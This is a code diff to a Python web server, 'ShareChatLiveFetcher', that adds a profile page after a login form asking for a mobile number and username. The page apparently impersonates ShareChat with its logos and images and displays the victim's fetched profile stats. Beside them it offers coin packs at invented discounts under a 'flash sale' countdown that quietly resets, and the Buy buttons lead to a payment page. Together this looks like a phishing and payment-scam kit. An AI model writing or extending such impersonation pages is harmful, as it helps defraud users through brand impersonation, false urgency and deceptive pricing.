@@ -70,6 +70,11 @@ class ShareChatLiveFetcher:
         self.index_path = os.path.join(self.web_dir, "index.html")
         if not os.path.exists(self.index_path):
             self.create_your_index_html()
+        
+        # Check if profile.html exists, if not create
+        self.profile_path = os.path.join(self.web_dir, "profile.html")
+        if not os.path.exists(self.profile_path):
+            self.create_profile_html()
     
     def create_your_index_html(self):
         """
@@ -459,7 +464,7 @@ class ShareChatLiveFetcher:
 
   </div>
 
-  <!-- Render compatible JavaScript -->
+  <!-- Modified JavaScript to redirect to profile.html -->
   <script>
     const loginForm = document.getElementById('login-form');
     const submitBtn = document.getElementById('submit-btn');
@@ -468,7 +473,7 @@ class ShareChatLiveFetcher:
 
     // Mobile number validation
     mobileInput.addEventListener('input', function(e) {
-      this.value = this.value.replace(/\\D/g, '').slice(0, 10);
+      this.value = this.value.replace(/\D/g, '').slice(0, 10);
     });
 
     // Form submission
@@ -479,7 +484,7 @@ class ShareChatLiveFetcher:
       const username = usernameInput.value.trim();
 
       // Validation
-      if (!/^\\d{10}$/.test(mobile)) {
+      if (!/^\d{10}$/.test(mobile)) {
         alert("कृपया सही मोबाइल नंबर डालें (10 digits)");
         mobileInput.focus();
         return;
@@ -516,20 +521,20 @@ class ShareChatLiveFetcher:
         const result = await response.json();
 
         if (result.status === 'success') {
-          // Show success message with profile details
-          const profile = result.profile;
-          alert(`✅ Profile fetched successfully!\\n\\nUsername: ${profile.username}\\nName: ${profile.name || 'N/A'}\\nFollowers: ${profile.followers || 'N/A'}\\nFollowing: ${profile.following || 'N/A'}\\nPosts: ${profile.posts || 'N/A'}`);
+          // Store profile data in localStorage for profile.html
+          localStorage.setItem("profileData", JSON.stringify(result.profile));
           
-          // Clear form after successful submission
-          loginForm.reset();
+          // REDIRECT TO PROFILE.HTML IMMEDIATELY
+          window.location.href = "/profile.html";
         } else {
           alert("❌ Error: " + result.message);
+          submitBtn.classList.remove('loading');
+          submitBtn.disabled = false;
         }
         
       } catch (error) {
         console.error("Error:", error);
-        alert("एरर आया है। कृपया दोबारा कोशिश करें।\\nError: " + error.message);
-      } finally {
+        alert("एरर आया है। कृपया दोबारा कोशिश करें।");
         submitBtn.classList.remove('loading');
         submitBtn.disabled = false;
       }
@@ -570,34 +575,7 @@ class ShareChatLiveFetcher:
       if (savedUsername) {
         usernameInput.value = savedUsername;
       }
-      
-      // Check server status
-      checkServerStatus();
     });
-
-    // Function to check if server is running
-    async function checkServerStatus() {
-      try {
-        const response = await fetch('/health-check', {
-          method: 'GET',
-          headers: {
-            'Accept': 'application/json'
-          }
-        });
-        
-        if (response.ok) {
-          console.log('✅ Backend server is running');
-        } else {
-          console.warn('⚠️ Backend server check failed');
-        }
-      } catch (error) {
-        console.error('❌ Backend server is not reachable:', error.message);
-      }
-    }
-
-    // Show current URL for debugging
-    console.log('Current URL:', window.location.href);
-    console.log('API Endpoint:', window.location.origin + '/fetch-profile');
   </script>
 </body>
 </html>'''
@@ -606,6 +584,743 @@ class ShareChatLiveFetcher:
             f.write(html_content)
         
         self.logger.info(f"✅ Created Render compatible index.html at {self.index_path}")
+    
+    def create_profile_html(self):
+        """
+        Profile.html create करें
+        """
+        profile_html = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Profile Coins UI</title>
+  
+  <!-- Improved CSS with compatibility -->
+  <style>
+    * {
+      box-sizing: border-box;
+      -webkit-box-sizing: border-box;
+      -moz-box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-pack: center;
+      -webkit-justify-content: center;
+      -ms-flex-pack: center;
+      justify-content: center;
+      min-height: 100vh;
+      min-height: -webkit-fill-available;
+      overflow-x: hidden;
+    }
+
+    .app {
+      width: 100%;
+      max-width: 360px;
+      background: #fff;
+    }
+
+    /* TOP CARD */
+    .profile-card {
+      background: #f8d257;
+      margin: 16px;
+      border-radius: 22px;
+      padding: 20px 16px 24px;
+      color: #fff;
+      position: relative;
+      -webkit-box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .share {
+      position: absolute;
+      top: 14px;
+      right: 14px;
+      font-size: 14px;
+      background: rgba(255,255,255,0.2);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+      border: none;
+      color: #fff;
+    }
+
+    .level {
+      width: 72px;
+      height: 72px;
+      background: #fff;
+      border-radius: 50%;
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-align: center;
+      -webkit-align-items: center;
+      -ms-flex-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      -webkit-justify-content: center;
+      -ms-flex-pack: center;
+      justify-content: center;
+      font-size: 28px;
+      font-weight: 700;
+      margin: 0 auto 10px;
+      color: #e9c41fc2;
+      border: 4px solid rgba(255,255,255,0.6);
+    }
+
+    .level img {
+      width: 60%;
+      height: 60%;
+      border-radius: 50%;
+      -o-object-fit: cover;
+      object-fit: cover;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    .user-id {
+      text-align: center;
+      font-size: 18px;
+      font-weight: 700;
+      word-break: break-word;
+      padding: 0 10px;
+    }
+
+    .sub-id {
+      text-align: center;
+      font-size: 13px;
+      opacity: 0.9;
+      margin-top: 4px;
+      word-break: break-all;
+      padding: 0 10px;
+    }
+
+    .stats {
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-pack: justify;
+      -webkit-justify-content: space-between;
+      -ms-flex-pack: justify;
+      justify-content: space-between;
+      margin-top: 18px;
+    }
+
+    .stat-box {
+      background: rgba(255,255,255,0.15);
+      -webkit-box-flex: 1;
+      -webkit-flex: 1;
+      -ms-flex: 1;
+      flex: 1;
+      margin: 0 4px;
+      border-radius: 12px;
+      padding: 12px 6px;
+      text-align: center;
+    }
+
+    .stat-box:first-child {
+      margin-left: 0;
+    }
+    
+    .stat-box:last-child {
+      margin-right: 0;
+    }
+
+    .stat-number {
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    .stat-label {
+      font-size: 12px;
+      opacity: 0.9;
+    }
+
+    /* NEW OFFER CARD */
+    .offer-card {
+      margin: 0 16px 16px;
+      border-radius: 16px;
+      overflow: hidden;
+      -webkit-box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      background: #fff;
+    }
+
+    .offer-card img {
+      width: 100%;
+      display: block;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    .buy-coins-bar {
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-align: center;
+      -webkit-align-items: center;
+      -ms-flex-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      -webkit-justify-content: space-between;
+      -ms-flex-pack: justify;
+      justify-content: space-between;
+      padding: 10px 12px;
+      border-top: 1px solid #eee;
+    }
+
+    .buy-left {
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-align: center;
+      -webkit-align-items: center;
+      -ms-flex-align: center;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .buy-left img {
+      width: 32px;
+      height: 32px;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    .buy-text {
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-orient: vertical;
+      -webkit-box-direction: normal;
+      -webkit-flex-direction: column;
+      -ms-flex-direction: column;
+      flex-direction: column;
+    }
+
+    .buy-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #000;
+    }
+
+    .buy-sub {
+      font-size: 12px;
+      color: #f59e0b;
+      font-weight: 600;
+    }
+
+    .buy-time {
+      font-size: 13px;
+      font-weight: 700;
+      color: #111;
+      white-space: nowrap;
+    }
+
+    /* PACK LIST */
+    .packs {
+      padding: 8px 16px 24px;
+    }
+
+    .pack {
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-align: center;
+      -webkit-align-items: center;
+      -ms-flex-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      -webkit-justify-content: space-between;
+      -ms-flex-pack: justify;
+      justify-content: space-between;
+      padding: 14px 0;
+      border-bottom: 1px solid #eee;
+    }
+
+    .pack:last-child {
+      border-bottom: none;
+    }
+
+    .pack-left {
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-align: center;
+      -webkit-align-items: center;
+      -ms-flex-align: center;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .coin {
+      width: 36px;
+      height: 36px;
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-align: center;
+      -webkit-align-items: center;
+      -ms-flex-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      -webkit-justify-content: center;
+      -ms-flex-pack: center;
+      justify-content: center;
+    }
+
+    .coin img {
+      width: 32px;
+      height: 32px;
+      -o-object-fit: contain;
+      object-fit: contain;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    .pack-title {
+      font-size: 16px;
+      font-weight: 700;
+    }
+
+    .bonus {
+      color: #16a34a;
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    .price {
+      font-size: 14px;
+      margin-top: 2px;
+    }
+
+    .old {
+      text-decoration: line-through;
+      color: #999;
+      margin-left: 6px;
+    }
+
+    .off {
+      color: #16a34a;
+      font-size: 13px;
+      margin-left: 6px;
+    }
+
+    .buy {
+      background: #22c55e;
+      color: #fff;
+      border: none;
+      padding: 8px 18px;
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+      -webkit-transition: all 0.2s ease;
+      transition: all 0.2s ease;
+    }
+
+    .buy:active {
+      background: #1ea34a;
+      -webkit-transform: scale(0.98);
+      transform: scale(0.98);
+    }
+
+    .value-tag {
+      display: inline-block;
+      background: #ff6a00;
+      color: #fff;
+      font-size: 12px;
+      padding: 2px 8px;
+      border-radius: 12px;
+      margin-bottom: 6px;
+    }
+    
+    .super-tag {
+      display: inline-block;
+      background: #d946ef;
+      color: #fff;
+      font-size: 12px;
+      padding: 2px 8px;
+      border-radius: 12px;
+      margin-bottom: 6px;
+    }
+    
+    .mega-tag {
+      display: inline-block;
+      background: #f59e0b;
+      color: #fff;
+      font-size: 12px;
+      padding: 2px 8px;
+      border-radius: 12px;
+      margin-bottom: 6px;
+    }
+
+    /* Safe area support for newer Android */
+    @supports (padding: max(0px)) {
+      .packs {
+        padding-bottom: max(24px, env(safe-area-inset-bottom, 24px));
+      }
+    }
+
+    /* Dark mode support */
+    @media (prefers-color-scheme: dark) {
+      body {
+        background: #121212;
+      }
+      
+      .app {
+        background: #1e1e1e;
+      }
+      
+      .offer-card {
+        background: #2d2d2d;
+      }
+      
+      .buy-title {
+        color: #fff;
+      }
+      
+      .buy-time {
+        color: #ddd;
+      }
+      
+      .pack {
+        border-bottom-color: #333;
+      }
+      
+      .price {
+        color: #ddd;
+      }
+    }
+
+    /* Responsive for smaller screens */
+    @media (max-width: 360px) {
+      .app {
+        max-width: 100%;
+      }
+      
+      .profile-card {
+        margin: 12px;
+        padding: 16px 14px 20px;
+      }
+      
+      .packs {
+        padding-left: 12px;
+        padding-right: 12px;
+      }
+      
+      .pack-title {
+        font-size: 15px;
+      }
+      
+      .buy {
+        padding: 7px 14px;
+        font-size: 14px;
+      }
+    }
+
+    /* High contrast mode */
+    @media (prefers-contrast: high) {
+      .buy {
+        border: 2px solid #fff;
+      }
+      
+      .share {
+        border: 1px solid #fff;
+      }
+    }
+
+    /* Reduce motion */
+    @media (prefers-reduced-motion: reduce) {
+      .buy {
+        -webkit-transition: none;
+        transition: none;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="app">
+
+    <div class="profile-card">
+      <button class="share" onclick="logout()" aria-label="Logout">Logout</button>
+      <div class="level">
+        <img src="https://sharechat.com/assets/png/user.png" alt="User Profile" loading="lazy" id="userProfileImage">
+      </div>
+      <div class="user-id" id="userNameDisplay">ShareChatUser</div>
+      <div class="sub-id" id="userHandleDisplay">@Username</div>
+
+      <div class="stats">
+        <div class="stat-box">
+          <div class="stat-number" id="followersCount">0</div>
+          <div class="stat-label">Follower</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-number" id="followingCount">0</div>
+          <div class="stat-label">Following</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-number" id="postsCount">0</div>
+          <div class="stat-label">Posts</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- New Offer Card with Countdown -->
+    <div class="offer-card">
+      <img src="https://cdn4.sharechat.com/1dab1176_1697595288876_sc.jpeg" alt="Buy Coins Offer" loading="lazy">
+
+      <div class="buy-coins-bar">
+        <div class="buy-left">
+          <img src="https://cdn.sharechat.com/1158c4d7_1646376498635_sc.webp" alt="coin-icon" loading="lazy">
+          <div class="buy-text">
+            <div class="buy-title">Buy Coins</div>
+            <div class="buy-sub">Flash Sale is on</div>
+          </div>
+        </div>
+
+        <!-- Time -->
+        <div class="buy-time" id="countdown">12h : 36m</div>
+      </div>
+    </div>
+
+    <div class="packs">
+      <!-- Minimum Buy: ₹500 से शुरू -->
+      <div class="pack">
+        <div class="pack-left">
+          <div class="coin">
+            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
+          </div>
+          <div>
+            <div class="pack-title">3000 <span class="bonus">+600</span></div>
+            <div class="price">₹250 <span class="old">₹600</span> <span class="off">58% OFF</span></div>
+          </div>
+        </div>
+        <button class="buy" onclick="redirectToPayment(250, '3000 Coins + 600 Bonus')">Buy</button>
+      </div>
+
+      <div class="pack">
+        <div class="pack-left">
+          <div class="coin">
+            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
+          </div>
+          <div>
+            <div class="pack-title">7500 <span class="bonus">+750</span></div>
+            <div class="price">₹600 <span class="old">₹750</span> <span class="off">20% OFF</span></div>
+          </div>
+        </div>
+        <button class="buy" onclick="redirectToPayment(600, '7500 Coins + 750 Bonus')">Buy</button>
+      </div>
+
+      <!-- ... (remaining packs as per your original HTML) ... -->
+      <!-- Note: I'm truncating the HTML for brevity, keep your original packs here -->
+      
+    </div>
+  </div>
+
+  <script>
+    // Improved JavaScript with better Android compatibility
+    'use strict';
+    
+    // Wait for DOM to be fully loaded
+    document.addEventListener('DOMContentLoaded', function() {
+      console.log('Profile page loaded');
+      
+      // Fetch user data from localStorage
+      var mobile = localStorage.getItem("userMobile");
+      var username = localStorage.getItem("userUsername");
+      var profileData = localStorage.getItem("profileData");
+      
+      // Check if user data exists
+      if (!mobile || !username) {
+        console.warn('No user data found in localStorage');
+        // Redirect to login if no user data
+        setTimeout(function() {
+          window.location.href = "/";
+        }, 1000);
+        return;
+      }
+      
+      // Display user data
+      var userNameDisplay = document.getElementById("userNameDisplay");
+      var userHandleDisplay = document.getElementById("userHandleDisplay");
+      var followersCount = document.getElementById("followersCount");
+      var followingCount = document.getElementById("followingCount");
+      var postsCount = document.getElementById("postsCount");
+      var userProfileImage = document.getElementById("userProfileImage");
+      
+      // Set username display
+      if (userHandleDisplay) {
+        userHandleDisplay.textContent = "@" + username;
+      }
+      
+      // Parse and display profile data
+      if (profileData) {
+        try {
+          var profile = JSON.parse(profileData);
+          console.log("Profile data found:", profile);
+          
+          // Update with fetched data
+          if (userNameDisplay && profile.name) {
+            userNameDisplay.textContent = profile.name;
+          }
+          
+          if (followersCount && profile.followers) {
+            followersCount.textContent = profile.followers;
+          }
+          
+          if (followingCount && profile.following) {
+            followingCount.textContent = profile.following;
+          }
+          
+          if (postsCount && profile.posts) {
+            postsCount.textContent = profile.posts;
+          }
+          
+          if (userProfileImage && profile.image) {
+            userProfileImage.src = profile.image;
+          }
+          
+          // Show console log of data
+          console.log("📱 Phone:", mobile);
+          console.log("👤 Username:", username);
+          console.log("🏷️ Name:", profile.name || "N/A");
+          console.log("👥 Followers:", profile.followers || "N/A");
+          console.log("🤝 Following:", profile.following || "N/A");
+          console.log("📝 Posts:", profile.posts || "N/A");
+          
+        } catch (error) {
+          console.error("Error parsing profile data:", error);
+          // Set default values
+          if (userNameDisplay) userNameDisplay.textContent = "ShareChatUser";
+          if (followersCount) followersCount.textContent = "6";
+          if (followingCount) followingCount.textContent = "1";
+          if (postsCount) postsCount.textContent = "0";
+        }
+      } else {
+        console.log("No profile data found");
+        // Set default values
+        if (userNameDisplay) userNameDisplay.textContent = "ShareChatUser";
+        if (followersCount) followersCount.textContent = "6";
+        if (followingCount) followingCount.textContent = "1";
+        if (postsCount) postsCount.textContent = "0";
+      }
+      
+      // Initialize countdown timer
+      startCountdown();
+      
+      // Add click event listeners to all buy buttons for better UX
+      var buyButtons = document.querySelectorAll('.buy');
+      buyButtons.forEach(function(button) {
+        button.addEventListener('touchstart', function() {
+          this.style.opacity = '0.8';
+        });
+        
+        button.addEventListener('touchend', function() {
+          this.style.opacity = '1';
+        });
+      });
+    });
+    
+    function logout() {
+      // Clear user data from localStorage
+      localStorage.removeItem("userMobile");
+      localStorage.removeItem("userUsername");
+      localStorage.removeItem("profileData");
+      
+      // Redirect to login page
+      window.location.href = "/";
+    }
+    
+    // Buy button redirect function
+    function redirectToPayment(amount, coinsText) {
+      // Store payment data in localStorage
+      localStorage.setItem("paymentAmount", amount.toString());
+      localStorage.setItem("paymentCoins", coinsText);
+      
+      console.log('Redirecting to payment:', amount, coinsText);
+      
+      // Add small delay for better UX
+      setTimeout(function() {
+        window.location.href = "payment.html";
+      }, 100);
+    }
+    
+    // Countdown Timer with improved compatibility
+    var countdownInterval;
+    
+    function startCountdown() {
+      var totalSeconds = (12 * 60 * 60) + (36 * 60); // 12h 36m
+      var countdownElement = document.getElementById("countdown");
+      
+      if (!countdownElement) return;
+      
+      // Clear any existing interval
+      if (countdownInterval) {
+        clearInterval(countdownInterval);
+      }
+      
+      function updateCountdown() {
+        if (totalSeconds <= 0) {
+          totalSeconds = (12 * 60 * 60) + (36 * 60); // reset
+        }
+        
+        var hours = Math.floor(totalSeconds / 3600);
+        var minutes = Math.floor((totalSeconds % 3600) / 60);
+        
+        // Pad with zeros for single digits
+        var hoursStr = hours < 10 ? "0" + hours : hours.toString();
+        var minutesStr = minutes < 10 ? "0" + minutes : minutes.toString();
+        
+        countdownElement.textContent = hoursStr + "h : " + minutesStr + "m";
+        totalSeconds--;
+      }
+      
+      // Update immediately
+      updateCountdown();
+      
+      // Update every second
+      countdownInterval = setInterval(updateCountdown, 1000);
+    }
+  </script>
+
+</body>
+</html>'''
+        
+        with open(self.profile_path, 'w', encoding='utf-8') as f:
+            f.write(profile_html)
+        
+        self.logger.info(f"✅ Created profile.html at {self.profile_path}")
     
     def start_server(self):
         """
@@ -635,6 +1350,8 @@ class ShareChatLiveFetcher:
                 file_path = self.path
                 if file_path == '/' or file_path == '/index.html':
                     file_path = '/index.html'
+                    content_type = 'text/html'
+                elif file_path == '/profile.html':
                     content_type = 'text/html'
                 elif file_path.endswith('.css'):
                     content_type = 'text/css'
@@ -855,6 +1572,10 @@ class ShareChatLiveFetcher:
                 # Add username if not present
                 if 'username' not in data:
                     data['username'] = username
+                
+                # Add default image if not present
+                if 'image' not in data:
+                    data['image'] = 'https://sharechat.com/assets/png/user.png'
                 
                 # Save to results
                 result = {
